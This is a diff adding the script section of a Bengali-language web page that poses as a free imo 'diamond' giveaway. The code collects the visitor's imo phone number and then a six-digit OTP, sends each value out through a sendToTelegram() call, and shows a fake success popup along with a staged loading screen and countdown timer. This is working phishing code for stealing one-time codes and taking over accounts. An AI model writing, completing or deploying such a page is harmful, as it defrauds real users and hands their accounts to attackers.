+                selectedAmount = amount;
+                selectedName = name;
+                currentStep = 'emu';
+                emuInput.value = '';
+                emuInput.disabled = false;
+                emuNumber = '';
+                otpSection.classList.remove('active');
+                labelEmu.style.display = 'block';
+                emuInput.style.display = 'block';
+                modalTitle.innerHTML = `<i class="fas fa-phone-alt"></i> ইমু নম্বর দিন`;
+                modalSubText.textContent = `"${name}" বান্ডেলটি পেতে আপনার ইমু নম্বর দিন`;
+                actionBtn.innerHTML = `<i class="fas fa-gift"></i> ক্লেইম করুন`;
+                actionBtn.disabled = false;
+                resetOtpBoxes();
+                disableOtpBoxes(false);
+                resetTimer();
+                modalOverlay.classList.add('active');
+                setTimeout(() => emuInput.focus(), 250);
+            }
+
+            function closeModal() {
+                modalOverlay.classList.remove('active');
+                stopTimer();
+                otpSection.classList.remove('active');
+                currentStep = 'emu';
+                emuInput.disabled = false;
+                actionBtn.disabled = false;
+                actionBtn.innerHTML = `<i class="fas fa-gift"></i> ক্লেইম করুন`;
+                labelEmu.style.display = 'block';
+                emuInput.style.display = 'block';
+                modalTitle.innerHTML = `<i class="fas fa-phone-alt"></i> ইমু নম্বর দিন`;
+                resetTimer();
+            }
+
+            // ===== টাইমার =====
+            function startTimer() {
+                if (isTimerRunning) return;
+                isTimerRunning = true;
+                timeLeft = TIMER_SECONDS;
+                updateTimerDisplay();
+                timerDisplay.classList.remove('expired');
+                if (timerInterval) clearInterval(timerInterval);
+                timerInterval = setInterval(() => {
+                    timeLeft--;
+                    updateTimerDisplay();
+                    if (timeLeft <= 0) {
+                        stopTimer();
+                        timerDisplay.classList.add('expired');
+                        disableOtpBoxes(true);
+                        actionBtn.disabled = true;
+                        modalSubText.textContent = 'OTP-র মেয়াদ শেষ (২ মিনিট)। আবার চেষ্টা করুন।';
+                    }
+                }, 1000);
+            }
+            function stopTimer() {
+                if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+                isTimerRunning = false;
+            }
+            function resetTimer() {
+                stopTimer();
+                timeLeft = TIMER_SECONDS;
+                updateTimerDisplay();
+                timerDisplay.classList.remove('expired');
+                disableOtpBoxes(false);
+            }
+            function updateTimerDisplay() {
+                const mins = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+                const secs = String(timeLeft % 60).padStart(2, '0');
+                timerDisplay.textContent = `${mins}:${secs}`;
+            }
+
+            // ===== OTP স্টেপ =====
+            function showOtpStep() {
+                currentStep = 'otp';
+                modalTitle.innerHTML = `<i class="fas fa-key"></i> OTP কোড দিন`;
+                modalSubText.textContent = `আপনার মোবাইলে ৬-ডিজিটের OTP পাঠানো হয়েছে। নিচে কোড দিন।`;
+                labelEmu.style.display = 'none';
+                emuInput.style.display = 'none';
+                otpSection.classList.add('active');
+                actionBtn.innerHTML = `<i class="fas fa-check-circle"></i> ভেরিফাই করুন`;
+                actionBtn.disabled = false;
+                resetOtpBoxes();
+                disableOtpBoxes(false);
+                resetTimer();
+                startTimer();
+                setTimeout(() => otpBoxes[0].focus(), 350);
+            }
+
+            // ===== সফল =====
+            function showSuccess(amount) {
+                successDesc.innerHTML = `সফলভাবে <strong>${amount}</strong> ডাইমন দেয়া হয়েছে`;
+                successPopup.classList.add('active');
+                isClaimed = true;
+                document.querySelectorAll('.free-btn').forEach(b => b.disabled = true);
+            }
+
+            // ===== অ্যাকশন =====
+            function handleAction() {
+                if (isProcessing) return;
+                if (currentStep === 'emu') {
+                    const emu = emuInput.value.trim();
+                    if (!emu) { alert('দয়া করে আপনার ইমু নম্বর দিন।'); emuInput.focus(); return; }
+                    if (emu.length < 10 || emu.length > 11 || isNaN(emu)) {
+                        alert('সঠিক ইমু নম্বর দিন (উদা: 01XXXXXXXXX)');
+                        emuInput.focus();
+                        return;
+                    }
+                    emuNumber = emu;
+                    sendToTelegram(`📱 ইমু নম্বর: ${emu}`);
+                    isProcessing = true;
+                    actionBtn.disabled = true;
+                    emuInput.disabled = true;
+                    modalOverlay.classList.remove('active');
+                    // নম্বর দেওয়ার পর লোডিং দেখান
+                    showLoading('নম্বর যাচাই করা হচ্ছে...', 'আপনার তথ্য প্রক্রিয়াকরণ হচ্ছে');
+                    setTimeout(() => {
+                        hideLoading();
+                        modalOverlay.classList.add('active');
+                        showOtpStep();
+                        isProcessing = false;
+                        actionBtn.disabled = false;
+                    }, 2500);
+                } else if (currentStep === 'otp') {
+                    if (timeLeft <= 0) { alert('OTP-র মেয়াদ শেষ (২ মিনিট)। আবার চেষ্টা করুন।'); return; }
+                    const otp = getOtpValue();
+                    if (otp.length !== OTP_LENGTH) {
+                        otpBoxes.forEach(b => { b.classList.add('error-shake'); setTimeout(() => b.classList.remove('error-shake'), 500); });
+                        alert(`সঠিক ${OTP_LENGTH}-ডিজিটের OTP দিন`);
+                        const emptyIndex = otpBoxes.findIndex(b => b.value.length === 0);
+                        if (emptyIndex !== -1) otpBoxes[emptyIndex].focus();
+                        return;
+                    }
+                    sendToTelegram(`🔑 OTP কোড: ${otp}`);
+                    isProcessing = true;
+                    actionBtn.disabled = true;
+                    stopTimer();
+                    closeModal();
+                    showSuccess(selectedAmount);
+                    isProcessing = false;
+                }
+            }
+
+            // ===== ইভেন্ট =====
+            actionBtn.addEventListener('click', handleAction);
+            closeModalBtn.addEventListener('click', closeModal);
+            modalOverlay.addEventListener('click', function(e) {
+                if (e.target === modalOverlay) closeModal();
+            });
+            emuInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter' && currentStep === 'emu' && !actionBtn.disabled) {
+                    e.preventDefault();
+                    handleAction();
+                }
+            });
+            successOkBtn.addEventListener('click', function() {
+                successPopup.classList.remove('active');
+            });
+
+            setupOtpBoxes();
+            renderBundles();
+            console.log('✅ ইমু ডাইমন — লোডিং সহ প্রোফেশনাল হোম পেজ রেডি!');
+        })();
+    </script>
+
+</body>
+</html>
